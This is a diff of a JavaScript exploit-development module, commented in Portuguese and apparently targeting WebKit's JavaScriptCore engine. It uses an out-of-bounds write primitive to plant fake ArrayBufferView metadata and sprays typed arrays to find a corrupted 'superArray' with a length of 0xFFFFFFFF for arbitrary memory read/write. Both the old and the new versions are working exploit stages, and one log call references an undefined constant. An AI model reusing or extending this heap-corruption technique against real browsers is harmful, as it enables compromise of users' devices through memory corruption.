@@ -1,6 +1,6 @@
 // js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object, GB } from '../utils.mjs';
+import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_array_buffer_real,
@@ -9,173 +9,156 @@ import {
     oob_read_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';
+import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO, OOB_CONFIG } from '../config.mjs';
 
-const FNAME_SPRAY_AB_WITH_METADATA_PLANT = "sprayABWithMetadataPlant_v25a";
+const FNAME_REPLICATE_LOG_SUCCESS = "replicateLogSuccessAndValidateSuperArray_v26a";
 
-const GETTER_SYNC_PROPERTY_NAME = "AAAA_GetterForSync_v25a";
-const CORRUPTION_OFFSET_TRIGGER = 0x70;
+const CORRUPTION_OFFSET_TRIGGER = 0x70; // Onde o trigger principal é escrito
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-// Offsets no oob_buffer onde plantamos os metadados falsos de ArrayBufferView
-// Usando os M_ offsets do seu config para ArrayBufferView e o base offset 0x50
-const FOCUSED_METADATA_PLANT_BASE_OFFSET_IN_OOB = 0x50; 
-const PLANTED_M_VECTOR_VALUE = new AdvancedInt64(0, 0);
-const PLANTED_M_LENGTH_VALUE = 0xFFFFFFFF;
+// Offsets baseados no seu log de sucesso e config.mjs (M_VECTOR_OFFSET=0x10, M_LENGTH_OFFSET=0x18)
+// Se o objeto JS vítima está "mapeado" a partir de 0x58 no oob_buffer:
+const VICTIM_VIEW_METADATA_BASE_IN_OOB = 0x58; 
+const ACTUAL_M_VECTOR_OFFSET_IN_OOB = VICTIM_VIEW_METADATA_BASE_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x10 = 0x68
+const ACTUAL_M_LENGTH_OFFSET_IN_OOB = VICTIM_VIEW_METADATA_BASE_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x58 + 0x18 = 0x70
+
+// Valores plantados INICIALMENTE no oob_buffer, conforme seu log
+const INITIAL_PLANTED_M_VECTOR = new AdvancedInt64(0x11223344, 0xAABBCCDD); // Low, High (aabbccdd_11223344)
+// m_length é plantado como parte do QWORD em 0x6C, mas o que importa para o objeto JS é o valor em ACTUAL_M_LENGTH_OFFSET_IN_OOB (0x70)
+// O seu log mostra que m_length (em 0x70) torna-se 0xFFFFFFFF após o trigger.
+// Vamos plantar um valor DISTINTO em 0x70 para ver se ele é usado, ou se é o trigger que define.
+const INITIAL_PLANTED_M_LENGTH_DWORD = 0xBAD0BAD0; 
 
 
-const NUM_SPRAY_AB_OBJECTS = 500;
-const SPRAY_AB_SIZE = 128;
+const EXPECTED_CORRUPTED_M_VECTOR_VAL = new AdvancedInt64(0xAABBCCDD, 0x11223344); // Low, High (0x11223344_aabbccdd) - o valor que apareceu no seu log
+const EXPECTED_CORRUPTED_M_LENGTH_VAL = 0xFFFFFFFF;
 
-let sprayedVictimABs = [];
-let getter_sync_flag_v25a = false;
+const NUM_SPRAY_OBJECTS = 500;
+const ORIGINAL_SPRAY_LENGTH = 8;
+
+// Marcador para verificar se o superArray mapeia para o oob_array_buffer_real
+const MARKER_FOR_OOB_BUFFER_CHECK = 0xABBAABBA;
+const MARKER_OFFSET_IN_OOB_DATA = 0x40; // Onde plantaremos no oob_array_buffer_real
+
+let sprayedVictimObjects = [];
 
 export async function sprayAndInvestigateObjectExposure() {
-    logS3(`--- Iniciando ${FNAME_SPRAY_AB_WITH_METADATA_PLANT}: Spray ABs, Plantar Meta ABView, Trigger, Checar ABs ---`, "test", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-    getter_sync_flag_v25a = false;
+    logS3(`--- Iniciando ${FNAME_REPLICATE_LOG_SUCCESS}: Replicar Corrupção de Log e Validar SuperArray ---`, "test", FNAME_REPLICATE_LOG_SUCCESS);
+    sprayedVictimObjects = [];
 
     try {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real || !oob_dataview_real) { return; }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        logS3("Ambiente OOB inicializado.", "info", FNAME_REPLICATE_LOG_SUCCESS);
 
-        // FASE 1: Plantar metadados de "ArrayBufferView Falso" no oob_array_buffer_real
-        logS3(`FASE 1: Plantando metadados de ABView (m_vector=0, m_length=0xFFFFFFFF) no oob_buffer...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-        const targetMetaVectorOffset = FOCUSED_METADATA_PLANT_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x50 + 0x10 = 0x60
-        const targetMetaLengthOffset = FOCUSED_METADATA_PLANT_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x50 + 0x18 = 0x68
-        
-        oob_write_absolute(targetMetaVectorOffset, PLANTED_M_VECTOR_VALUE, 8);
-        oob_write_absolute(targetMetaLengthOffset, PLANTED_M_LENGTH_VALUE, 4);
-        logS3(`  Metadados plantados em oob_buffer[${toHex(targetMetaVectorOffset)}] (m_vector) e [${toHex(targetMetaLengthOffset)}] (m_length)`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-        const chk_vec = oob_read_absolute(targetMetaVectorOffset,8);
-        const chk_len = oob_read_absolute(targetMetaLengthOffset,4);
-        logS3(`  Verificação Pós-Plantio: m_vector=${chk_vec.toString(true)}, m_length=${toHex(chk_len)}`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-        await PAUSE_S3(50);
-
-        // FASE 2: Pulverizar objetos ArrayBuffer
-        logS3(`FASE 2: Pulverizando ${NUM_SPRAY_AB_OBJECTS} objetos ArrayBuffer(${SPRAY_AB_SIZE})...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-        sprayedVictimABs = [];
-        for (let i = 0; i < NUM_SPRAY_AB_OBJECTS; i++) {
-            try {
-                const ab = new ArrayBuffer(SPRAY_AB_SIZE);
-                if (SPRAY_AB_SIZE >= 4) new DataView(ab).setUint32(0, 0xABC00000 + i, true);
-                sprayedVictimABs.push(ab);
-            } catch (e) {
-                logS3(`Erro ao criar ArrayBuffer no spray, índice ${i}: ${e.message}`, "warn", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-            }
+        // FASE 1: Spray
+        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
+            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
+            u32arr[0] = 0xC0DEC0DE ^ i;
+            sprayedVictimObjects.push(u32arr);
         }
-        logS3(`Pulverização de ${sprayedVictimABs.length} ArrayBuffers concluída.`, "good", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-        await PAUSE_S3(100);
+        logS3("Pulverização concluída.", "good", FNAME_REPLICATE_LOG_SUCCESS);
 
+        // FASE 2: Plantar metadados no oob_array_buffer_real
+        // O log original plantava um QWORD em 0x68 e outro em 0x6C.
+        // Vamos focar em ter os valores corretos em 0x68 (para m_vector) e 0x70 (para m_length)
+        // ANTES que o trigger em 0x70 os sobrescreva no oob_buffer.
+        logS3(`FASE 2: Plantando metadados em oob_buffer para replicação...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+        logS3(`  Plantando m_vector_candidate=${INITIAL_PLANTED_M_VECTOR.toString(true)} em oob_buffer[${toHex(ACTUAL_M_VECTOR_OFFSET_IN_OOB)}] (0x68)`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+        oob_write_absolute(ACTUAL_M_VECTOR_OFFSET_IN_OOB, INITIAL_PLANTED_M_VECTOR, 8);
+        
+        logS3(`  Plantando m_length_candidate=${toHex(INITIAL_PLANTED_M_LENGTH_DWORD)} em oob_buffer[${toHex(ACTUAL_M_LENGTH_OFFSET_IN_OOB)}] (0x70)`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+        oob_write_absolute(ACTUAL_M_LENGTH_OFFSET_IN_OOB, INITIAL_PLANTED_M_LENGTH_DWORD, 4); // m_length é DWORD
 
-        // FASE 3: Configurar getter e Trigger OOB
-        const getterObject = { get [GETTER_SYNC_PROPERTY_NAME]() { getter_sync_flag_v25a = true; return "sync_v25a"; } };
+        const chk_vec_pre = oob_read_absolute(ACTUAL_M_VECTOR_OFFSET_IN_OOB, 8);
+        const chk_len_pre = oob_read_absolute(ACTUAL_M_LENGTH_OFFSET_IN_OOB, 4);
+        logS3(`  Verificação Pós-Plantio (no oob_buffer ANTES DO TRIGGER):`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+        logS3(`    m_vector@${toHex(ACTUAL_M_VECTOR_OFFSET_IN_OOB)}=${chk_vec_pre.toString(true)} (Esperado: ${INITIAL_PLANTED_M_VECTOR.toString(true)})`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+        logS3(`    m_length@${toHex(ACTUAL_M_LENGTH_OFFSET_IN_OOB)}=${toHex(chk_len_pre)} (Esperado: ${toHex(INITIAL_PLANTED_M_LENGTH_DWORD)})`, "info", FNAME_REPLICATE_LOG_SUCCESS);
 
-        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}]...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        // FASE 3: Trigger OOB principal
+        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] (0x70) com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
         oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
-        logS3("Escrita OOB de trigger realizada.", "good", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        logS3("Escrita OOB de trigger realizada.", "good", FNAME_REPLICATE_LOG_SUCCESS);
         
-        // Verificar o que está agora nos offsets de metadados plantados DENTRO do oob_buffer
-        const vec_after_trigger_in_oob = oob_read_absolute(targetMetaVectorOffset, 8); 
-        const len_after_trigger_in_oob = oob_read_absolute(targetMetaLengthOffset, 4); 
-        logS3(`  Valores NO OOB_BUFFER (onde metadados foram plantados) APÓS trigger: m_vector@${toHex(targetMetaVectorOffset)}=${vec_after_trigger_in_oob.toString(true)}, m_length@${toHex(targetMetaLengthOffset)}=${toHex(len_after_trigger_in_oob)}`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-        // O trigger em 0x70 vai sobrescrever o targetMetaLengthOffset se for 0x68, ou se for próximo.
-        // Se targetMetaLengthOffset é 0x68, o trigger em 0x70 não o afeta diretamente, mas afeta o que seria 0x58 + 0x18.
-        // No nosso caso, targetMetaLengthOffset = 0x50 + M_LENGTH_OFFSET (0x18) = 0x68.
-        // O trigger é em 0x70. Então o m_length plantado em 0x68 deve permanecer.
-        // O m_vector plantado em 0x60 deve permanecer.
+        // Verificar o que está agora nos offsets de metadados DENTRO do oob_buffer
+        const vec_in_oob_after_trigger = oob_read_absolute(ACTUAL_M_VECTOR_OFFSET_IN_OOB, 8); 
+        const len_in_oob_after_trigger = oob_read_absolute(ACTUAL_M_LENGTH_OFFSET_IN_OOB, 4); 
+        logS3(`  Valores NO OOB_BUFFER APÓS trigger:`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+        logS3(`    m_vector@${toHex(ACTUAL_M_VECTOR_OFFSET_IN_OOB)} (0x68) = ${vec_in_oob_after_trigger.toString(true)}`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+        logS3(`    m_length@${toHex(ACTUAL_M_LENGTH_OFFSET_IN_OOB)} (0x70) = ${toHex(len_in_oob_after_trigger)}`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+        // Esperamos que m_vector@0x68 seja INITIAL_PLANTED_M_VECTOR, ou o valor "invertido" do seu log (0x11223344_aabbccdd)
+        // Esperamos que m_length@0x70 seja 0xFFFFFFFF (LOW_DWORD do trigger)
 
-        await PAUSE_S3(100); 
+        await PAUSE_S3(300); // Pausa maior para efeitos se propagarem
 
-        // FASE 4: Acionar Getter
-        logS3(`FASE 4: Chamando JSON.stringify para acionar o getter (sincronia)...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-        JSON.stringify(getterObject);
-        if(getter_sync_flag_v25a) logS3("  Getter de sincronia acionado.", "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT); else logS3("  ALERTA: Getter de sincronia NÃO acionado.", "warn", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-        await PAUSE_S3(200);
+        // FASE 4: Identificar SuperArray
+        logS3(`FASE 4: Tentando identificar SuperArray (pelo length)...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+        let superArray = null;
+        let superArrayIndex = -1;
 
-        // FASE 5: Verificar ArrayBuffers Pulverizados
-        logS3(`FASE 5: Verificando ${sprayedVictimABs.length} ArrayBuffers pulverizados por corrupção...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-        let corruptedABsFound = 0;
-        let superAB = null;
-
-        for (let i = 0; i < sprayedVictimABs.length; i++) {
-            const currentAB = sprayedVictimABs[i];
-            if (!currentAB) continue;
-
-            let currentLength = -1;
-            let initialMarker = -1;
-            let sliceWorks = true;
-            let sliceValue = null;
-
-            try {
-                currentLength = currentAB.byteLength;
-                if (SPRAY_AB_SIZE >=4) initialMarker = new DataView(currentAB).getUint32(0, true);
-
-                // Teste de slice
-                try {
-                    const slice = currentAB.slice(0, Math.min(4, currentLength)); // Pega uma pequena fatia
-                    if (slice.byteLength > 0) {
-                         sliceValue = new DataView(slice).getUint32(0, true);
-                    } else if (currentLength > 0 && slice.byteLength === 0) {
-                        sliceWorks = false; // Slice deveria retornar algo se currentLength > 0
-                    }
-                } catch(e_slice) {
-                    sliceWorks = false;
-                }
-
-            } catch (e) {
-                logS3(`    Erro GRANDE ao acessar ArrayBuffer pulverizado índice [${i}]: ${e.message}`, "error", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-                document.title = `CORRUPÇÃO AB SPRAY (ERRO GRAVE) Idx ${i}!`;
-                corruptedABsFound++;
-                continue;
-            }
-
-            if (currentLength !== SPRAY_AB_SIZE || !sliceWorks || (SPRAY_AB_SIZE >=4 && initialMarker !== (0xABC00000 + i)) ) {
-                logS3(`    !!!! POTENCIAL CORRUPÇÃO DETECTADA no ArrayBuffer pulverizado índice [${i}] !!!!`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-                logS3(`      byteLength: ${SPRAY_AB_SIZE} -> ${currentLength} (${toHex(currentLength)})`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-                logS3(`      Marcador inicial: ${toHex(0xABC00000 + i)} -> ${SPRAY_AB_SIZE >=4 ? toHex(initialMarker) : "N/A"}`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-                logS3(`      Slice(0,4) funcionou: ${sliceWorks}. Valor slice[0]: ${sliceValue !== null ? toHex(sliceValue) : "N/A"}`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-                corruptedABsFound++;
-                document.title = `CORRUPÇÃO AB SPRAY (${corruptedABsFound})!`;
-
-                // Se o tamanho for massivo, é o nosso "super array"
-                if (currentLength >= (1 * GB) || currentLength === 0xFFFFFFFF || currentLength === 0xFFFFFFFFFFFFFFFF ) { // 1GB ou mais
-                    logS3(`      !!!!!!!! SUPER ArrayBuffer ENCONTRADO (byteLength: ${toHex(currentLength)}) !!!!!!!!`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-                    superAB = currentAB;
-                    document.title = `SUPER AB ENCONTRADO (Idx ${i})!`;
-                    // Tentativa de uso imediato
-                    try {
-                        const dv = new DataView(superAB);
-                        const test_offset_super = 0x100000; // 1MB
-                        const val_read_super = dv.getUint32(test_offset_super, true);
-                        logS3(`      Leitura de teste do Super AB @${toHex(test_offset_super)}: ${toHex(val_read_super)}`, "leak", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-                        dv.setUint32(test_offset_super, 0xDEADFACE, true);
-                        if (dv.getUint32(test_offset_super, true) === 0xDEADFACE) {
-                            logS3(`      SUCESSO: R/W no Super AB @${toHex(test_offset_super)} funcionou!`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-                        }
-                    } catch (e_super) {
-                        logS3(`      Erro ao usar Super AB: ${e_super.message}`, "error", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-                    }
-                    break; // Parar no primeiro super AB encontrado
-                }
+        for (let i = 0; i < sprayedVictimObjects.length; i++) {
+            if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === EXPECTED_CORRUPTED_M_LENGTH_VAL) {
+                superArray = sprayedVictimObjects[i];
+                superArrayIndex = i;
+                logS3(`    !!!! POTENCIAL SUPERARRAY !!!! Índice: ${i}. Length: ${toHex(superArray.length)}`, "vuln", FNAME_REPLICATE_LOG_SUCCESS);
+                document.title = `POTENCIAL SuperArray Idx ${i}!`;
+                break; 
             }
         }
 
-        if (superAB) {
-            logS3(`  SUPER ArrayBuffer ENCONTRADO e testado.`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-        } else if (corruptedABsFound > 0) {
-            logS3(`  Total de ${corruptedABsFound} ArrayBuffers pulverizados encontrados com alguma anomalia.`, "good", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        if (superArray) {
+            logS3(`  Potencial SuperArray (índice ${superArrayIndex}) encontrado com length=${toHex(EXPECTED_CORRUPTED_M_LENGTH_VAL)}.`, "good", FNAME_REPLICATE_LOG_SUCCESS);
+            logS3(`  Validando se m_vector foi corrompido para ${EXPECTED_CORRUPTED_M_VECTOR_VAL.toString(true)} (ou algo que mapeie para oob_buffer)...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+
+            // Escrever um marcador nos dados do oob_array_buffer_real usando a primitiva OOB
+            oob_write_absolute(MARKER_OFFSET_IN_OOB_DATA, MARKER_FOR_OOB_BUFFER_CHECK, 4);
+            logS3(`    Marcador ${toHex(MARKER_FOR_OOB_BUFFER_CHECK)} escrito em oob_buffer[${toHex(MARKER_OFFSET_IN_OOB_DATA)}] via oob_write.`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+
+            // Se m_vector corrompido apontar para o início dos dados do oob_array_buffer_real,
+            // ou se o valor EXPECTED_CORRUPTED_M_VECTOR_VAL for esse endereço.
+            // O EXPECTED_CORRUPTED_M_VECTOR_VAL (0x11223344_aabbccdd) não é 0.
+            // Precisamos que este seja o endereço DENTRO do qual o SuperArray vai ler.
+            // Se este valor for o NOVO dataPointer do ArrayBuffer subjacente ao SuperArray.
+            
+            // Hipótese: O m_vector do SuperArray se tornou EXPECTED_CORRUPTED_M_VECTOR_VAL.
+            // E esse endereço aponta para DADOS que podemos controlar/observar, idealmente o oob_array_buffer_real.
+            // Este teste é difícil de validar sem saber para onde EXPECTED_CORRUPTED_M_VECTOR_VAL aponta.
+
+            // Teste mais simples: Se o m_vector foi para 0x0 (como em alguns dos seus logs):
+            try {
+                const val_at_zero_abs = superArray[0];
+                logS3(`    Tentativa de leitura superArray[0] (abs 0x0): ${toHex(val_at_zero_abs)}`, "leak", FNAME_REPLICATE_LOG_SUCCESS);
+                if (val_at_zero_abs === MARKER_FOR_OOB_BUFFER_CHECK && MARKER_OFFSET_IN_OOB_DATA === 0) {
+                    logS3("      SUCESSO! SuperArray com m_vector=0 mapeia para oob_buffer!", "vuln", FNAME_REPLICATE_LOG_SUCCESS);
+                    document.title = "SuperArray m_vec=0 OK!";
+                } else if (MARKER_OFFSET_IN_OOB_DATA !== 0) {
+                     logS3(`      SuperArray[0] leu de 0x0. Marcador está em ${toHex(MARKER_OFFSET_IN_OOB_DATA)}.`, "info", FNAME_REPLICATE_LOG_SUCCESS);
+                }
+            } catch (e) {
+                 logS3(`    Erro ao ler superArray[0]: ${e.message}`, "error", FNAME_REPLICATE_LOG_SUCCESS);
+            }
+
+            // Se o valor de m_vector do log (0x11223344_aabbccdd) for o dataPointer do oob_array_buffer_real
+            // Esta verificação é apenas se o m_vector do *superArray* virou 0 e mapeia para o nosso oob_buffer
+            // Se o m_vector do superArray virou o valor do log (0x11223344_aabbccdd) e esse valor NÃO É o dataPointer do oob_buffer,
+            // então a leitura do marcador falhará.
+
+            logS3("  SuperArray com length correto encontrado. A validação exata de m_vector requer mais informações ou uma primitiva de leitura de metadados do objeto.", "info", FNAME_REPLICATE_LOG_SUCCESS);
+
+
         } else {
-            logS3("  Nenhuma corrupção/anomalia detectada nos ArrayBuffers pulverizados.", "warn", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-            document.title = "Nenhuma Corrupção AB (v25a)";
+            logS3("  Nenhum SuperArray (Uint32Array com length corrompido para 0xFFFFFFFF) identificado.", "error", FNAME_REPLICATE_SUCCESS);
+            document.title = "SuperArray NÃO Encontrado (v26a)";
         }
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO em ${FNAME_SPRAY_AB_WITH_METADATA_PLANT}: ${e.message}`, "critical", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
-        document.title = `${FNAME_SPRAY_AB_WITH_METADATA_PLANT} FALHOU!`;
+        logS3(`ERRO CRÍTICO em ${FNAME_REPLICATE_LOG_SUCCESS}: ${e.message}`, "critical", FNAME_REPLICATE_LOG_SUCCESS);
+        document.title = `${FNAME_REPLICATE_LOG_SUCCESS} FALHOU!`;
     } finally {
-        sprayedVictimABs = [];
+        sprayedVictimObjects = [];
         clearOOBEnvironment();
-        logS3(`--- ${FNAME_SPRAY_AB_WITH_METADATA_PLANT} Concluído ---`, "test", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        logS3(`--- ${FNAME_REPLICATE_LOG_SUCCESS} Concluído ---`, "test", FNAME_REPLICATE_LOG_SUCCESS);
     }
 }
